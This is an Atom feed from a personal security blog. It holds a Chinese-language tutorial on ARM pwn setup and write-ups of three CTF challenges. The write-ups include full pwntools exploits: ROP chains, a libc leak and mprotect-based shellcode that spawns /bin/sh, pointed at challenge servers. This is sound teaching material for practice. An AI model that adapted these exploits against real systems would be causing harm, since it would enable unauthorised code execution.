<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>The lair of C0yo7e</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-02-07T17:44:12.312Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>C0yo7e</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>arm的环境搭建+简单的例题</title>
    <link href="http://yoursite.com/2020/02/07/arm%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E9%A2%98/"/>
    <id>http://yoursite.com/2020/02/07/arm的环境搭建-简单的例题/</id>
    <published>2020-02-07T14:54:19.000Z</published>
    <updated>2020-02-07T17:44:12.312Z</updated>
    
    <content type="html"><![CDATA[<p>关于arm的东西我好像已经拖了将近一个月了，不能再拖下去了，先记一些吧，之后我陆续补坑看看</p><h2 id="arm环境搭建"><a href="#arm环境搭建" class="headerlink" title="arm环境搭建"></a>arm环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#安装qemu</span><br><span class="line">apt-get install qemu</span><br><span class="line">#更新一下</span><br><span class="line">sudo apt-get update</span><br><span class="line">#安装32位的依赖库</span><br><span class="line">sudo apt-get install -y gcc-arm-linux-gnueabi</span><br><span class="line">#运行32位的动态链接程序方法</span><br><span class="line">qemu-arm -L /usr/arm-linux-gnueabi ./文件</span><br><span class="line">#安装64位的依赖库</span><br><span class="line">sudo apt-get install -y gcc-aarch64-linux-gnu g++-aarch64-linux-gnu</span><br><span class="line">#运行64位的动态链接程序方法</span><br><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./文件</span><br><span class="line">#安装gdb调试工具</span><br><span class="line">sudo apt-get install git gdb gdb-multiarch</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="32位的调试步骤："><a href="#32位的调试步骤：" class="headerlink" title="32位的调试步骤："></a>32位的调试步骤：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#运行32位的动态链接程序方法</span><br><span class="line">qemu-arm -L /usr/arm-linux-gnueabi ./文件</span><br><span class="line"></span><br><span class="line">#32位程序下断调试步骤</span><br><span class="line">1： qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./文件(窗口1)</span><br><span class="line">2： qemu-arm-static -g 1234 ./文件（窗口1）</span><br><span class="line"></span><br><span class="line">gdb-multiarch ./文件(窗口2)</span><br><span class="line">pwndbg&gt; target remote :1234</span><br><span class="line">pwndbg&gt; b *0x8bb0</span><br><span class="line">pwndbg&gt; c</span><br></pre></td></tr></table></figure><h3 id="64位的调试步骤："><a href="#64位的调试步骤：" class="headerlink" title="64位的调试步骤："></a>64位的调试步骤：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#运行64位的动态链接程序方法</span><br><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./文件</span><br><span class="line">#64位程序下断调试步骤</span><br><span class="line">qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./文件(窗口1)</span><br><span class="line">gdb-multiarch ./文件(窗口2)</span><br><span class="line">pwndbg&gt; target remote :1234</span><br><span class="line">pwndbg&gt; b *0x8bb0</span><br><span class="line">pwndbg&gt; c</span><br></pre></td></tr></table></figure><h3 id="起qemu的那个虚拟机"><a href="#起qemu的那个虚拟机" class="headerlink" title="起qemu的那个虚拟机"></a>起qemu的那个虚拟机</h3><p>（上面那些命令行好像更方便一点，这个的话可能每次打题都要起一次）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; -net nic,macaddr=52:54:00:12:34:56 -net tap -nographic</span><br></pre></td></tr></table></figure><h2 id="架构下的寄存器"><a href="#架构下的寄存器" class="headerlink" title="架构下的寄存器"></a>架构下的寄存器</h2><h3 id="64位的寄存器"><a href="#64位的寄存器" class="headerlink" title="64位的寄存器"></a>64位的寄存器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x0~x7：传递子程序的参数和返回值，使用时不需要保存，多余的参数用堆栈传递，64位的返回结果保存在x0中。</span><br><span class="line">x8：用于保存子程序的返回地址，使用时不需要保存。</span><br><span class="line">x9~x15：临时寄存器，也叫可变寄存器，子程序使用时不需要保存。</span><br><span class="line">x16~x17：子程序内部调用寄存器（IPx），使用时不需要保存，尽量不要使用。</span><br><span class="line">x18：平台寄存器，它的使用与平台相关，尽量不要使用。</span><br><span class="line">x19~x28：临时寄存器，子程序使用时必须保存。</span><br><span class="line">x29：帧指针寄存器（FP），用于连接栈帧，使用时必须保存。</span><br><span class="line">x30：链接寄存器（LR），用于保存子程序的返回地址。</span><br><span class="line">x31：堆栈指针寄存器（SP），用于指向每个函数的栈顶。</span><br></pre></td></tr></table></figure><h3 id="32位的寄存器"><a href="#32位的寄存器" class="headerlink" title="32位的寄存器"></a>32位的寄存器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r0-r3: 用于函数调用入参，32位最多支持4个入参，当多于4个入参是将通过压栈方式进行传递。栈的方式为先进后出，估参数大于4个时 入栈顺序与参数顺序正好相反，子程序返回前无需回复R0~R3的值,32位的返回结果保存在r0中。</span><br><span class="line">r4-r11: 用于保存局部变量。函数进入后首先第一件事就是将R4~R11入栈保存(看局部变量用了多少个，不一定所有都需要入栈)，然后才能用于本函数使用，本函数使用完之后，要将之前栈保存的数据恢复到R4~R11中</span><br><span class="line">r7: 系统调用时，存放系统调用号，有时也用于作为FP使用。FP又叫frame pointer即栈基指针，主要在函数中保存当前函数的栈起始位置，用于堆栈回溯。</span><br><span class="line">r13: SP，即栈指针寄存器，主要用于指向当前程序栈顶，配合指令pop/push等。</span><br><span class="line">r14: LR，即链接寄存器，主要用于存放函数的返回地址，即当前函数返回时，知道自己该回到哪儿去继续运行。</span><br><span class="line">r15: PC，即程序寄存器，主要用于存放CPU取指的地址。是取值地址，不是当前运行地址。</span><br></pre></td></tr></table></figure><p><img src="/2020/02/07/arm的环境搭建-简单的例题/1.png" alt></p><h2 id="arm的简单例题"><a href="#arm的简单例题" class="headerlink" title="arm的简单例题"></a>arm的简单例题</h2><h3 id="32位简单的arm"><a href="#32位简单的arm" class="headerlink" title="32位简单的arm"></a>32位简单的arm</h3><h4 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h4><p>就是道很简单的ret2text<br>用命令行先连上qume和gdb，让它跑起来</p><p><img src="/2020/02/07/arm的环境搭建-简单的例题/2.png" alt></p><p><img src="/2020/02/07/arm的环境搭建-简单的例题/3.png" alt></p><p>然后就可以调了<br>我们在gdb里生成字符串，自己输的话，计算长度可能会出bug<br>调出长度之后就去找程序有没有system(‘/bin/sh’)<br>这个东西去了函数符号表，我不会那个rizzo的恢复，所以直接找字符’/bin/sh’</p><p><img src="/2020/02/07/arm的环境搭建-简单的例题/4.png" alt><br>会发现它在一个函数里<br>这个长得就很像execve，f5进去看一下</p><p><img src="/2020/02/07/arm的环境搭建-简单的例题/5.png" alt><br>然后这个名字就很像了，再加上系统调用号也出来了<br>（经大佬指点才知道arm32中系统调用号是在r7里的）<br>点开汇编，发现它确实是<br><img src="/2020/02/07/arm的环境搭建-简单的例题/6.png" alt><br>然后我们就用syscall来做这题吧<br>syscall要用的话，肯定是要r1、 r2的参数都得为null的<br>所以我们去找gadget<br><img src="/2020/02/07/arm的环境搭建-简单的例题/7.png" alt><br>r0的就只有一个，然后还有相关的r1和r7都能对应找到<br>唯独发现没有pop r2的gadget，所以我们考虑一下xor或者是mov（xor好像在arm里没有）<br><img src="/2020/02/07/arm的环境搭建-简单的例题/8.png" alt><br>这里面对r2有赋值为零的gadget，我们可以用一波，但事实它还自带三个pop，为了堆栈平衡，我们就还得填充三个0<br>差不多就可以写exp了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &quot;l&quot;:</span><br><span class="line">    io = process(&quot;./typo&quot;, timeout = 2)</span><br><span class="line">elif sys.argv[1] == &quot;d&quot;:</span><br><span class="line">    io = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;./typo&quot;])</span><br><span class="line">else:</span><br><span class="line">    io = remote(&quot;pwn2.jarvisoj.com&quot;, 9888, timeout = 2)</span><br><span class="line"></span><br><span class="line">mov_r2 = 0x0004df00 #mov r2, #0 ; mov r0, r2 ; pop &#123;r3, r4, r5, pc&#125;</span><br><span class="line">syscall = 0x0002165C</span><br><span class="line">pop_r3_r7 =0x0000a958</span><br><span class="line">pop_r0_r4 = 0x00020904 #pop &#123;r0, r4, pc&#125;</span><br><span class="line">pop_r1 = 0x00068bec</span><br><span class="line">pop_r7 = 0x00014068#0x00008160</span><br><span class="line">binsh = 0x0006c384</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*112 </span><br><span class="line">payload += p32(mov_r2)</span><br><span class="line">payload += p32(0)+p32(0)+p32(0)</span><br><span class="line">payload += p32(pop_r0_r4)</span><br><span class="line">payload += p32(binsh)+p32(0)</span><br><span class="line">payload += p32(pop_r7)+p32(0xb)</span><br><span class="line">payload += p32(pop_r1)+p32(0)</span><br><span class="line">payload += p32(syscall)</span><br><span class="line"># r0-&gt;binsh  r1,r2-&gt;0  arm的系统调用号存在r7</span><br><span class="line"># io.sendline(&apos;\n&apos;)</span><br><span class="line">io.sendlineafter(&quot;if you want to quit\n&quot;, &apos;\n&apos;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>然后我碰到一个很难受的bug，本地加了context.log_level = “debug”是能跑通的，但是不加就不行了，为啥呢，害，到时候再探究探究</p><h4 id="melong（arm32位）"><a href="#melong（arm32位）" class="headerlink" title="melong（arm32位）"></a>melong（arm32位）</h4><p>这题是个 简单的栈题，我被难倒的地方是offset到底是什么<br>这题的栈溢出存在于write那个函数里的read<br>用-1绕过len，使我们可以输入很多的东西，可以构造rop链<br><img src="/2020/02/07/arm的环境搭建-简单的例题/9.png" alt><br>write函数里面长这样，我们到出去看a2是什么<br><img src="/2020/02/07/arm的环境搭建-简单的例题/10.png" alt><br><img src="/2020/02/07/arm的环境搭建-简单的例题/11.png" alt><br>发现是v4，去找他的偏移，发现是0x54，就一般在我的印象里，偏移应该是ebp+0x54，所以应该再加一个4的，但是看了很多exp都是用的0x54</p><p>发现我们需要覆盖到dd4的地方 r11（d14-&gt;exid即下一个函数的地址存放处）而开始覆盖是在d80，offset为84 即 0x54（但是我并没有在ida里找到那段代码）<br><img src="/2020/02/07/arm的环境搭建-简单的例题/12.png" alt><br>这个是我写入100个字符之后，触发exit之后报错之后，计算出来的 偏移，就是0x54，这题也确实比较独特，ida里的偏移果然不一定是对的</p><p>然后用put的方法leak的话呢，本来以为会比较快捷方便一点，但是这里最想不到的是，进入了puts函数之后，结尾时会否存在pop，pc又在哪里赋值，在傻傻地用正常栈的方法试了一遍发现不行，选择跟进去看看puts里面的玄机</p><p>发现在末尾它有一个pop<br><img src="/2020/02/07/arm的环境搭建-简单的例题/13.png" alt><br>所以要想回到主函数还要填充些值进寄存器里</p><p>exp大概就如下了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level =&apos;DEBUG&apos;</span><br><span class="line">import sys</span><br><span class="line">context.binary = &quot;./melong&quot;</span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &quot;r&quot;:</span><br><span class="line">    p = remote(&quot;localhost&quot;, 9999)</span><br><span class="line">elif sys.argv[1] == &quot;l&quot;:</span><br><span class="line">    p = process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;./&quot;, &quot;./melong&quot;])</span><br><span class="line">else:</span><br><span class="line">    p = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;./&quot;, &quot;./melong&quot;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./melong&quot;, checksec = False)</span><br><span class="line">libc = ELF(&quot;./lib/libc.so.6&quot;, checksec = False)</span><br><span class="line"></span><br><span class="line">def check(height,weight):</span><br><span class="line">p.sendlineafter(&quot;number:&quot;,&quot;1&quot;)</span><br><span class="line">p.sendlineafter(&quot;height(meters) :&quot;,str(height))</span><br><span class="line">p.sendlineafter(&quot;weight(kilograms) :&quot;,str(weight))</span><br><span class="line"></span><br><span class="line">def exercise():</span><br><span class="line">p.sendlineafter(&quot;number:&quot;,&quot;2&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def register(num):</span><br><span class="line">p.sendlineafter(&quot;number:&quot;,&quot;3&quot;)</span><br><span class="line">p.sendlineafter(&quot;training?&quot;,str(num))</span><br><span class="line"></span><br><span class="line">def write(content):</span><br><span class="line">p.sendlineafter(&quot;number:&quot;,&quot;4&quot;)</span><br><span class="line"># p.sendlineafter(&apos;\n&apos;,content)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def out():</span><br><span class="line">p.sendlineafter(&quot;number:&quot;,&quot;6&quot;)</span><br><span class="line"></span><br><span class="line">pop = 0x00011bbc</span><br><span class="line">check(1.58,49.8)</span><br><span class="line">register(-1)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x54+p32(pop) + p32(elf.got[&apos;puts&apos;]) + p32(elf.sym[&apos;puts&apos;]) +p32(0)*7+p32(elf.sym[&apos;main&apos;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write(payload)</span><br><span class="line">out()</span><br><span class="line">p.recvuntil(&quot;See you again :)\n&quot;)</span><br><span class="line"></span><br><span class="line">put_addr = u32(p.recvn(4))</span><br><span class="line">print hex(put_addr)</span><br><span class="line"></span><br><span class="line">libc.address = put_addr - libc.sym[&apos;puts&apos;]</span><br><span class="line">print hex(libc.address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">check(1.58,49.8)</span><br><span class="line">register(-1)</span><br><span class="line"></span><br><span class="line">pay = &quot;a&quot;*0x54 + p32(pop) + p32(next(libc.search(&quot;/bin/sh&quot;))) + p32(libc.sym[&apos;system&apos;])</span><br><span class="line"></span><br><span class="line">write(pay)</span><br><span class="line">out()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="64位简单题"><a href="#64位简单题" class="headerlink" title="64位简单题"></a>64位简单题</h3><h4 id="2018-上海大学生网络安全大赛-babyarm"><a href="#2018-上海大学生网络安全大赛-babyarm" class="headerlink" title="2018 上海大学生网络安全大赛 babyarm"></a>2018 上海大学生网络安全大赛 babyarm</h4><p>开了nx<br><img src="/2020/02/07/arm的环境搭建-简单的例题/14.png" alt></p><p>一眼看到了mprotect函数，一般呢有它就是改权限然后写shellcode了，上一次用这个好像是level5，emmmm碰巧这题好像也可以用这个方法做，听说是有三个参数的函数要调用和写参的话就用csu这种方法比较简单</p><p>我们知道这个题目有两层输入，第一层是不存在溢出的，第二处才存在，所以我们在第二处用csu的方法再调用回存储第一处输入的位置<br>所以我们找一下万能gadget</p><p>我们发现mprotect的几个参数传递过程如下</p><p><img src="/2020/02/07/arm的环境搭建-简单的例题/15.png" alt></p><p>mprotect是从0x411000开始的，题目中输入的地址为0x411068，所以可以让mprotect来改权限（这题好像和oj leve5不一样的是它不需要借助bss段了</p><p><img src="/2020/02/07/arm的环境搭建-简单的例题/16.png" alt></p><p>关于gadget的传参</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ret     跳转到 x30 寄存器，一般在函数的末尾会恢复函数的返回地址到 x30 寄存器</span><br><span class="line"></span><br><span class="line">ldp x19, x20, [sp, #0x10]     从 sp+0x10 的位置读 0x10 字节，按顺序放入 x19, x20 寄存器</span><br><span class="line"></span><br><span class="line">ldp x29, x30, [sp], #0x40      从 sp 的位置读 0x10 字节，按顺序放入 x29, x30 寄存器，然后 sp += 0x40</span><br><span class="line"></span><br><span class="line">MOV X1, X0  寄存器X0的值传给X1</span><br><span class="line"></span><br><span class="line">blr x3      跳转到由Xm目标寄存器指定的地址处，同时将下一条指令存放到X30寄存器中</span><br></pre></td></tr></table></figure><p>所以x29和x30会在x19和x20前面布置<br>x30是存放下一个执行的地址，相当于ebp吧<br>pc相当于rdi<br>所以我们布置rop：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*72 </span><br><span class="line">payload += p64(0x04008cc)</span><br><span class="line">payload += p64(0) #x29</span><br><span class="line">payload += p64(0x04008ac) #x30 ret-&gt;next pc</span><br><span class="line">payload += p64(0) #19</span><br><span class="line">payload += p64(0) #20</span><br><span class="line">payload += p64(bss) #21   mprotect_addr </span><br><span class="line">payload += p64(0x7) #22  x2</span><br><span class="line">payload += p64(0x1000) #23  x1</span><br><span class="line">payload += p64(0x411000) #24  x0</span><br><span class="line">payload += p64(0) #next x29</span><br><span class="line">payload += p64(bss+0x10) #next x30</span><br></pre></td></tr></table></figure><p>先布置完cc处的栈，然后跳回ac里执行mprotect，会再执行一遍cc，我们覆盖x30的内容为我们想它跳到的地址即可</p><p>完整的exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.binary = &quot;./pwn&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &quot;l&quot;:</span><br><span class="line">    p = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;./pwn&quot;])</span><br><span class="line">elif sys.argv[1] == &quot;d&quot;:</span><br><span class="line">    p = process([&quot;qemu-aarch64&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;./pwn&quot;])</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;106.75.126.171&quot;, 33865)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss = 0x00411068</span><br><span class="line">call_mprotect = 0x0400600</span><br><span class="line">shellcode = asm(shellcraft.execve(&quot;/bin/sh&quot;))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Name:&quot;)</span><br><span class="line">pay = p64(0x04007e0) #call_mprotect</span><br><span class="line">pay += p64(0)</span><br><span class="line">pay += shellcode   #must in addr+0x10</span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*72 </span><br><span class="line">payload += p64(0x04008cc)</span><br><span class="line">payload += p64(0) #x29</span><br><span class="line">payload += p64(0x04008ac) #x30 ret-&gt;next pc</span><br><span class="line">payload += p64(0) #19</span><br><span class="line">payload += p64(0) #20</span><br><span class="line">payload += p64(bss) #21   mprotect  </span><br><span class="line">payload += p64(0x7) #22  x2</span><br><span class="line">payload += p64(0x1000) #23  x1</span><br><span class="line">payload += p64(0x411000) #24  x0</span><br><span class="line">payload += p64(0) #next x29?</span><br><span class="line">payload += p64(bss+0x10) #next x30</span><br><span class="line">sleep(0.5)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<br>        <a href="https://gdufs-king.github.io/2019/11/06/32%E4%BD%8D%E3%80%8164%E4%BD%8D%E4%B8%8B%E7%9A%84arm_pwn/" target="_blank" rel="noopener">https://gdufs-king.github.io/2019/11/06/32%E4%BD%8D%E3%80%8164%E4%BD%8D%E4%B8%8B%E7%9A%84arm_pwn/</a><br>        <a href="https://zszcr.github.io/2018/11/05/2018-11-5-%E3%80%90%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E3%80%91baby_arm%E5%A4%8D%E7%8E%B0/#more" target="_blank" rel="noopener">https://zszcr.github.io/2018/11/05/2018-11-5-%E3%80%90%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E3%80%91baby_arm%E5%A4%8D%E7%8E%B0/#more</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于arm的东西我好像已经拖了将近一个月了，不能再拖下去了，先记一些吧，之后我陆续补坑看看&lt;/p&gt;
&lt;h2 id=&quot;arm环境搭建&quot;&gt;&lt;a href=&quot;#arm环境搭建&quot; class=&quot;headerlink&quot; title=&quot;arm环境搭建&quot;&gt;&lt;/a&gt;arm环境搭建&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;#安装qemu&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;apt-get install qemu&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#更新一下&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get update&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#安装32位的依赖库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install -y gcc-arm-linux-gnueabi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#运行32位的动态链接程序方法&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;qemu-arm -L /usr/arm-linux-gnueabi ./文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#安装64位的依赖库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install -y gcc-aarch64-linux-gnu g++-aarch64-linux-gnu&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#运行64位的动态链接程序方法&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;qemu-aarch64 -L /usr/aarch64-linux-gnu ./文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#安装gdb调试工具&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install git gdb gdb-multiarch&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>fastbinin_attack</title>
    <link href="http://yoursite.com/2020/02/07/fastbinin-attack/"/>
    <id>http://yoursite.com/2020/02/07/fastbinin-attack/</id>
    <published>2020-02-07T13:59:05.000Z</published>
    <updated>2020-02-07T14:44:05.996Z</updated>
    
